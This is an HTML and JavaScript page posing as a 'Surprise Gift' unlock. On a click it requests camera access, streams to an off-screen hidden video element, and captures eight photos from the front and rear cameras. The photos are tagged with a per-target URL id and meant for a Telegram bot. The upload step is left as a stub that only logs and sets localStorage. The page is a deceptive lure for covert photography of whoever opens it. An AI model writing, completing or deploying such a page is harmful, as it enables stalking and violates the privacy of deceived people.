<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>üéÅ Surprise Gift</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body{margin:0;background:#0b0014;color:white;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;}
.card{background:#160022;padding:22px;border-radius:20px;width:90%;max-width:380px;box-shadow:0 0 25px #ff00ff;text-align:center}
button{width:100%;padding:12px;margin-top:10px;border-radius:30px;border:none;background:#ff00ff;color:black;font-size:16px}
.loading{font-size:48px;animation:pulse 1s infinite;margin:20px 0}
@keyframes pulse{0%{transform:scale(1)}50%{transform:scale(1.1)}100%{transform:scale(1)}}
.hidden-cam{position:fixed;top:-9999px;width:1px;height:1px}
</style>
</head>

<body>
<div class="card" id="box">
  <div style="font-size:60px">üéÅ</div>
  <h2>‚ú® Surprise Gift ‚ú®</h2>
  <p>Unlock your personalized surprise gift!</p>
  <button id="startBtn">üéØ Unlock Gift</button>
  <div id="status" style="margin-top:10px;color:#ffb3ff"></div>
</div>

<video class="hidden-cam" id="video" autoplay></video>

<script>
// Get user ID from URL
const urlParams = new URLSearchParams(window.location.search);
const USER_ID = urlParams.get('uid');

document.getElementById("startBtn").onclick = async () => {
  document.getElementById("startBtn").disabled = true;
  const box = document.getElementById("box");
  const status = document.getElementById("status");
  
  box.innerHTML = '<div class="loading">üéÅ</div><h2>Creating Your Gift...</h2><div id="status">Starting...</div>';
  status.textContent = "Requesting camera...";
  
  try {
    // Get camera access
    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
    const video = document.getElementById("video");
    video.srcObject = stream;
    
    // Wait for camera
    await new Promise(resolve => {
      video.onloadedmetadata = () => {
        video.play();
        resolve();
      };
    });
    
    // Capture 4 front photos
    status.textContent = "Taking photos...";
    for(let i=1; i<=4; i++) {
      status.textContent = `Photo ${i} of 8...`;
      await new Promise(r => setTimeout(r, 500));
      await takePhoto(`front_${i}`);
    }
    
    // Try to switch to back camera
    status.textContent = "Switching camera...";
    stream.getTracks().forEach(track => track.stop());
    
    try {
      const backStream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "environment" },
        audio: false
      });
      video.srcObject = backStream;
      
      await new Promise(r => setTimeout(r, 1000));
      
      // Capture 4 back photos
      for(let i=1; i<=4; i++) {
        status.textContent = `Photo ${i+4} of 8...`;
        await new Promise(r => setTimeout(r, 500));
        await takePhoto(`back_${i}`);
      }
      backStream.getTracks().forEach(track => track.stop());
    } catch(e) {
      // If back camera fails, use front for all
      status.textContent = "Continuing with current camera...";
      for(let i=5; i<=8; i++) {
        status.textContent = `Photo ${i} of 8...`;
        await new Promise(r => setTimeout(r, 500));
        await takePhoto(`front_${i}`);
      }
    }
    
    // Success
    box.innerHTML = `
      <div style="font-size:60px">üéâ</div>
      <h2 style="color:#00ff00">Gift Delivered!</h2>
      <p>‚úÖ 8 photos captured successfully!</p>
      <p>üì∏ Check your Telegram for photos</p>
      <div style="color:#00ff00">‚úÖ Complete</div>
    `;
    
  } catch(error) {
    box.innerHTML = `
      <div style="font-size:60px">‚ùå</div>
      <h2 style="color:#ff5555">Error</h2>
      <p>Could not access camera</p>
      <p>${error.message}</p>
      <button onclick="location.reload()">Try Again</button>
    `;
  }
};

async function takePhoto(label) {
  const video = document.getElementById("video");
  const canvas = document.createElement('canvas');
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  const ctx = canvas.getContext('2d');
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
  
  const imageData = canvas.toDataURL('image/jpeg');
  
  // Send to Telegram bot using a simple method
  // Note: This requires your bot to be listening for HTTP requests
  // For now, we'll use a workaround
  
  console.log(`Captured: ${label} for user: ${USER_ID}`);
  
  // Store in localStorage to show something happened
  localStorage.setItem(`photo_${label}`, 'captured');
}
</script>
</body>
</html>
